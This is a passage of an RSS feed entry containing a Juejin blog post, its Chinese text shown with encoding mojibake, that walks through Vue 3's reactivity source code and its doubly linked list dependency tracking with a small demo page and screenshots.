content="ğŸ”¥Vue é‡‡ç”¨åŒé“¾è¡¨é‡æ„å“åº”å¼ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js,æºç é˜…è¯»"/> <meta itemprop="datePublished" content="2026-01-30T11:23:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moseå‰ç«¯"/> <meta itemprop="url" content="https://juejin.cn/user/2436173500528103"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ”¥Vue é‡‡ç”¨åŒé“¾è¡¨é‡æ„å“åº”å¼ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173500528103/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moseå‰ç«¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:23:13.000Z" title="Fri Jan 30 2026 11:23:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»Šå¤©å’±ä»¬æ¥èŠèŠ Vue å“åº”å¼ç³»ç»Ÿâ€”â€”è¿™ä¸ªè®©ä½ å†™ä»£ç æ—¶â€œæ•°æ®è‡ªåŠ¨å˜è§†å›¾ï¼Œè§†å›¾è‡ªåŠ¨å˜æ•°æ®â€çš„ç¥å¥‡é­”æ³•ï¼Œvue3å‘å¸ƒåï¼Œç½‘ä¸Šå¾ˆå¤šåˆ†æVue3å“åº”å¼æºç ï¼ŒåŸºäºweakMap -&gt; map -&gt; setçš„è¿™ç§æ•°æ®èŠ‚åå®ç°å“åº”å¼ï¼Œï¼Œå…¶å®æ—©å°±å·å·ç”¨åŒé“¾è¡¨é‡æ„äº†å“åº”å¼æ ¸å¿ƒï¼Œç©å‡ºäº†æ–°èŠ±æ ·ï¼Œä»Šå¤©å°±å¸¦å¤§å®¶æ‰’ä¸€æ‰’è¿™ä»½æºç ï¼Œæ–°æ‰‹ä¹Ÿèƒ½çœ‹æ‡‚ï¼Œè€é¸Ÿä¹Ÿèƒ½è¡¥æ¼ï½~</p>
<p>å…ˆæŠ›ä¸ªçµé­‚æ‹·é—®ï¼šä¸ºå•¥Vue3è¦æ”¾ç€å¥½å¥½çš„Setä¾èµ–æ”¶é›†æ–¹æ¡ˆä¸ç”¨ï¼Œéè¦æŠ˜è…¾åŒé“¾è¡¨ï¼Ÿç­”æ¡ˆå¾ˆç®€å•â€”â€”<strong>Setæ–¹æ¡ˆå¤ªâ€œç¬¨â€ï¼Œæ€§èƒ½æ‹‰èƒ¯è¿˜éº»çƒ¦</strong>ï¼Vue3æ—©æœŸçš„å“åº”å¼ä¾èµ–æ”¶é›†ï¼Œç”¨çš„æ˜¯Setæ¥å­˜å‚¨å‰¯ä½œç”¨å‡½æ•°ï¼Œçœ‹ä¼¼ç®€æ´ï¼Œä½†åˆ é™¤ä¾èµ–æ—¶è¦éå†æ•´ä¸ªSetæŸ¥æ‰¾ç›®æ ‡ï¼Œæ›´æ–°çš„æ—¶å€™æ›´æ˜¯â€œå¤§æ°´æ¼«çŒâ€ï¼Œæ˜æ˜åªæ”¹äº†ä¸€ä¸ªå˜é‡ï¼Œå´è¦è§¦å‘ä¸€å †æ— å…³çš„æ›´æ–°ï¼ŒCPUéƒ½è¦å“­äº†ã€‚</p>
<p>è€ŒåŒé“¾è¡¨ï¼Œå°±æ˜¯Vue3ç»™å“åº”å¼â€œå¼€çš„å¤–æŒ‚â€â€”â€”è½»é‡ã€é«˜æ•ˆã€èƒ½ç²¾å‡†å®šä½ï¼Œå®Œç¾è§£å†³äº†Setæ”¶é›†çš„ç—›ç‚¹ã€‚å°±åƒç»™ä¾èµ–å…³ç³»è£…äº†ä¸ªâ€œå¯¼èˆªä»ªâ€ï¼Œæ‰¾ä¾èµ–ã€æ›´ä¾èµ–ã€åˆ ä¾èµ–ï¼Œä¸€æ­¥åˆ°ä½ï¼Œå†ä¹Ÿä¸ç”¨åƒSeté‚£æ ·çéå†æµªè´¹æ€§èƒ½ã€‚è¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šæºç ï¼Œè¾¹çœ‹è¾¹åæ§½ï½</p>
<h2 data-id="heading-1">æºç é˜…è¯»</h2>
<p>å¦‚æœè¿˜ä¸çŸ¥åˆ°æºç é˜…è¯»æŠ€å·§ï¼Œåˆå§‹å‡†å¤‡ï¼Œå¯ä»¥çœ‹ä¸‹åšä¸»ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://juejin.cn/post/7600002531398778889" target="_blank" title="https://juejin.cn/post/7600002531398778889"># 90% çš„äººè¯»ä¸æ‡‚ Vue æºç ï¼Œæ˜¯å› ä¸ºæ²¡åšè¿™äº›å‡†å¤‡</a></p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªdemoæ–‡ä»¶index.htmlï¼Œé€šè¿‡æ–­ç‚¹æ–¹å¼æ¥é˜…è¯»æºç ï¼Œå¯ä»¥æ›´æ¸…æ™°çš„çœ‹åˆ°ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­æ•°æ®æµçš„å˜åŒ–</p>
<pre><code class="hljs language-js" lang="js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Vue Effect Test&lt;/title&gt;

    &lt;!-- å¼•å…¥ä½ æœ¬åœ° clone çš„ vue.global.js --&gt;
    &lt;script src="../../../../vue/dist/vue.global.js"&gt;&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;div id="text"&gt;&lt;/div&gt;

    &lt;button id="btn"&gt;count++&lt;/button&gt;

    &lt;script&gt;
        const { reactive, ref, effect } = Vue;

        // åˆ›å»ºå“åº”å¼æ•°æ®
        const state = reactive({
            count1: 1,
            count2: 2
        });

        // ç»‘å®š effectï¼šä¾èµ–æ”¶é›† + è‡ªåŠ¨æ›´æ–°
        effect(() =&gt; {
            // å»ºç«‹ä¸€ä¸ªé“¾è¡¨å…³ç³» 
            document.getElementById('text').innerText =
                `å½“å‰ count å€¼ï¼š${state.count1}`;
        });
        document.getElementById('btn').onclick = () =&gt; {
            state.count1++;
        };
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 data-id="heading-2">ä¾èµ–æ”¶é›†trackå‡½æ•°</h3>
<p>é˜…è¯»å“åº”å¼ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°<code>vue</code>å“åº”å¼æ¨¡å—<code>reactivity</code>æ¨¡å—ä¸‹<code>reactive.ts</code>æ–‡ä»¶ï¼Œç„¶åæ‰¾åˆ°reactiveå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å“åº”å¼å¯¹è±¡æ˜¯é€šè¿‡ <code>createReactiveObject</code>å‡½æ•°åˆ›å»ºå‡ºæ¥çš„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e4d458b707d494baf0bc346097c74ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=q4XSL%2FFMPkDn2D1d69PJNMLdmZI%3D" alt="image.png" loading="lazy"/></p>
<p>å½“æˆ‘ä»¬æ·±å…¥åˆ° <code>createReactiveObject</code> å‡½æ•°å†…éƒ¨ï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶äº”ä¸ªå‚æ•°ã€‚é€šè¿‡é€è¡Œè°ƒè¯•ï¼ˆdebuggerï¼‰æ‰§è¡Œå…¶ä»£ç é€»è¾‘å¯ä»¥æ¸…æ™°çœ‹åˆ°ï¼Œå‡½æ•°æœ€ç»ˆä¼šè¿”å›ä¸€ä¸ª Proxy å¯¹è±¡ â€”â€” è¿™æ­£æ˜¯ Vue å“åº”å¼ç³»ç»Ÿçš„æ ¸å¿ƒå®ç°åŸºç¡€ã€‚å¦‚æ­¤çœ‹æ¥ï¼Œå¤§åé¼é¼çš„ Proxy æ ¸å¿ƒåŸç†ï¼Œæ‹†è§£å¼€æ¥å…¶å®ä¹Ÿå¹¶ä¸å¤æ‚ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40c31f67ad624d1bb9f8214e1d028863~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=KzFNQIpA3vHT1L5Uz1psGGT53SE%3D" alt="image.png" loading="lazy"/></p>
<p>ç”±ä¸Šå›¾å¯è§ï¼Œ<code>baseHandlers</code>å…¶å®æœ¬è´¨å°±æ˜¯<code>MutableReactiveHandler</code>ï¼Œä½œä¸º<code>createReactiveObject</code>å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’è¿›å»ï¼Œå¯ä»¥çœ‹åˆ° <code>MutableReactiveHandler</code> ä¸­æœ‰ <code>get, set, deleteProperty, has, ownKeys </code>ç­‰æ–¹æ³•,<code>get</code>æ–¹æ³•ç»§æ‰¿è‡ª <code>BaseReactiveHandler</code>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ab89e5284c445029ff3744cd0e7ec4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=8NO8hIDLjlpa2%2BPY1RHAIfuPr18%3D" alt="image.png" loading="lazy"/></p>
<p>æŸ¥çœ‹getå–å€¼æ“ä½œï¼Œå¯ä»¥çœ‹åˆ°getæ“ä½œä¸»è¦åšçš„æ˜¯trackä¾èµ–æ”¶é›†ï¼Œæ”¶é›†å®Œæ¯•åæŠŠcount1åˆå§‹å€¼è¿”å›ï¼Œä¾›é¡µé¢å±•ç¤ºä½¿ç”¨ï¼ˆå¿½ç•¥åˆ¤æ–­ï¼Œæˆ‘ä»¬åªå…³å¿ƒä¸»çº¿é€»è¾‘ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e582c3c8d5ed44298136b601707b8f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=tBzGajVVThrS2Qy%2B1pNsvQElUsg%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ <code>get</code> å‡½æ•°å†…éƒ¨ï¼Œæœ‰ä¸€ä¸ªæ ¸å¿ƒæ“ä½œæ˜¯ <code>track</code>ï¼ˆä¾èµ–è¿½è¸ªï¼‰ã€‚æ·±å…¥åˆ° <code>track</code> å‡½æ•°çš„å®ç°é€»è¾‘ä¸­å¯ä»¥å‘ç°ï¼Œ<code>Vue</code> æ˜¯é€šè¿‡ä¸€å¥—å±‚çº§åŒ–çš„æ•°æ®ç»“æ„æ¥ç»„ç»‡å“åº”å¼ä¾èµ–æ”¶é›†çš„ï¼šæœ€å¤–å±‚æ˜¯ <code>WeakMap</code>ï¼Œå…¶ä¸‹åµŒå¥— Mapï¼Œæœ€ç»ˆæŒ‡å‘å…·ä½“çš„ Dep å®ä¾‹ã€‚æˆ‘ä»¬è¿›åˆ°<code>track</code>å‡½æ•°å†…éƒ¨, é¦–å…ˆä¼šæŸ¥æ‰¾å½“å‰<code>targetMap</code>ä¸­æ˜¯å¦æœ‰<code>target</code>å¯¹åº”çš„<code>map</code>, æ²¡æœ‰æˆ‘ä»¬ä¼šåˆ›å»ºä¸€ä¸ª<code>map</code>, ç„¶åæˆ‘ä»¬ä¼šæŸ¥æ‰¾å½“å‰<code>count1</code>æ˜¯å¦æœ‰å¯¹åº”çš„<code>Dep</code>å®ä¾‹ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ª<code>Dep</code>å¯¹è±¡</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dbb600edf9a4c658c74dac460ce35ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=juVF2ltgHVPAtm9BWMIJbTFUXPg%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çœ‹æ ¸å¿ƒæ“ä½œ<code>dep.track</code>, è¿™æ˜¯æˆ‘ä»¬ä¾èµ–æ”¶é›†çš„æ ¸å¿ƒå‡½æ•°; é¦–å…ˆä¼šé€šè¿‡<code>Link</code>ç±»åˆ›å»ºä¸€ä¸ª<code>link</code>èŠ‚ç‚¹, å…¶ä¸­ <code>activeSub</code>æ˜¯å½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œ<code>this</code>æ˜¯å½“å‰çš„<code>dep</code>å¯¹è±¡, è¿™ä¹Ÿæ˜¯ä¸ºå•¥è¯´<code>link</code>æ˜¯è¿æ¥<code>dep</code>å’Œ<code>sub</code>çš„æ¡¥æ¢, åˆå§‹æ—¶å€™æˆ‘ä»¬ä¸åšæŒ‡é’ˆåç§»ï¼Œä½†æ˜¯è®¿é—®<code>count2</code>æ˜¯è¦è¿›è¡Œé“¾è¡¨æ–°å¢æ“ä½œçš„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4dbc89523f074defb5ccee6e3825de0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=WayiFTYZGuS9SC%2FFREj0Tb8%2BNcI%3D" alt="image.png" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥æ‰§è¡Œ<code>addSub</code>, æˆ‘ä»¬çœ‹çœ‹<code>addSub</code>ä¸­åˆ°åº•åšäº†ä»€ä¹ˆ? å…¶å®å°±æ˜¯æ›´æ–°<code>sub</code>å¯¹åº”çš„å‰å<code>sub</code>æŒ‡é’ˆï¼Œç”±äºæˆ‘ä»¬å½“å‰åªæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œæ‰€ä»¥<code>prevSub</code>æ˜¯<code>undefined</code>,æœ€åå½“å‰ <code>link</code> æŒ‚åˆ°å®ƒæ‰€å±çš„ <code>dep</code> ä¸Šï¼Œä½œä¸ºè¯¥ <code>dep</code> è®¢é˜…è€…é“¾è¡¨çš„å…¥å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†count1çš„æ”¶é›†ï¼Œcount2ç±»ä¼¼çš„é˜…è¯»æ€è·¯</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cdb969910974485aa29715518bdd630~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=n5SR%2BPkrMIxMEhwV4oh57dLn6ZU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">ä¾èµ–è§¦å‘triggerå‡½æ•°</h3>
<p>æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®ï¼Œä¿®æ”¹<code>count1</code>çš„å€¼ï¼Œæ­¤æ—¶æˆ‘ä»¬æƒ³è¦åšçš„æ˜¯é€šçŸ¥å‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œï¼Œä»è€Œè®©é¡µé¢è§†å›¾æ›´æ–°ï¼Œé‚£<code>vue</code>æ˜¯æ€ä¹ˆè§¦å‘æ›´æ–°çš„å‘¢ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a6a289e0d36436b82d4f24b61dddaec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=jLsc0a0%2BOgqvvycS3mmRE9A2VQ0%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶ä¸­runæ–¹æ³•å†…éƒ¨æ ¸å¿ƒæ‰§è¡Œ<code>dep.trigger</code>æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df9a6608bb9b4369b1a31a58bee11b30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=%2BnjghH54TxWdPVgMCMzjeTIvXdA%3D" alt="image.png" loading="lazy"/>
<code>dep.trigger</code>æ–¹æ³•å†…éƒ¨ï¼Œåœ¨<code>finally</code>å°¾éƒ¨æ‰§è¡Œ<code>endBatch</code>æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0397aa331b04a9ab07c324e73520ae8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=RIV7EeuQBF4YMYHbJppetmluI5k%3D" alt="image.png" loading="lazy"/>
triggerå‡½æ•°å¦‚ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf58aa573298453ab032bd2ee496b17d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=1lPlw4G4GKMVomrh996h9V%2FgnUY%3D" alt="image.png" loading="lazy"/></p>
<p>åˆ¤æ–­æ˜¯å¦è‚®ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬æ›´æ–°äº†æ•°æ®ï¼Œéœ€è¦æ‰§è¡Œå‰¯ä½œç”¨,æ‰€ä»¥æ‰§è¡Œ<code>this.runIfDirty</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d309a3c1327a4ebeb2f6f349079130c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=8PJE8i3m5iIXHDqgxDLJ%2FQctXKs%3D" alt="image.png" loading="lazy"/></p>
<p><code>this.runIfDirty</code>å†…éƒ¨è°ƒç”¨<code>this.run</code>æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6bea8f33dd34b7994570a565ec76ccf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=%2BVHxUL%2F%2BHK%2BHfT5V7C7GM4mnnV4%3D" alt="image.png" loading="lazy"/></p>
<p><code>run</code>æ–¹æ³•ä¸­è¿”å› <code>this.fn()</code>å‡½æ•°
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa6261f160254daaa9a90bb2ba71dfc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=r76Ohi8SEtBbCmhnWKiyxp0K2n4%3D" alt="image.png" loading="lazy"/></p>
<p>å…¶ä¸­fnå°±æ˜¯æˆ‘ä»¬çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œæ‰¾åˆ°æ‰§è¡Œå®ƒå°±okå•¦</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5901e395d3c24649ad9cc425ed264015~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=JCmeY8wnXIH5Vi7Xt1jpPlFtyg4%3D" alt="image.png" loading="lazy"/>
è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†å‰¯ä½œç”¨çš„æ‰§è¡Œ</p>
<h2 data-id="heading-4">æ€»ç»“</h2>
<p>æœ€åï¼ŒåŒé“¾è¡¨çš„ç»“æ„å›¾å¤§è‡´å¯ä»¥æŠ½è±¡ä¸º</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d141a79d91eb462388d176cab77321ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9zZeWJjeerrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770377203&amp;x-signature=gzDjJVXBi1cmfcnig7CNT4wmLhA%3D" alt="image.png" loading="lazy"/></p>
<p>å¥½äº†ï¼Œä»Šå¤©çš„æºç æ‹†è§£å°±åˆ°è¿™é‡Œã€‚</p>
<p>åŸåˆ›ä¸æ˜“ï¼Œå¦‚æœå¯¹ä½ æœ‰å¸®åŠ©ï¼Œç‚¹ä¸ªå°èµã€å…³æ³¨~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¸‚åœºè¡Œæƒ…æ”¶è—åˆ—è¡¨è”åŠ¨çš„çŠ¶æ€ç®¡ç†]]></title>    <link>https://juejin.cn/post/7600868443832746003</link>    <guid>https://juejin.cn/post/7600868443832746003</guid>    <pubDate>2026-01-30T11:52:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600868443832746003" data-draft-id="7600692485947621385" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¸‚åœºè¡Œæƒ…æ”¶è—åˆ—è¡¨è”åŠ¨çš„çŠ¶æ€ç®¡ç†"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T11:52:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Naomi_"/> <meta itemprop="url" content="https://juejin.cn/user/2107109724924174"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" 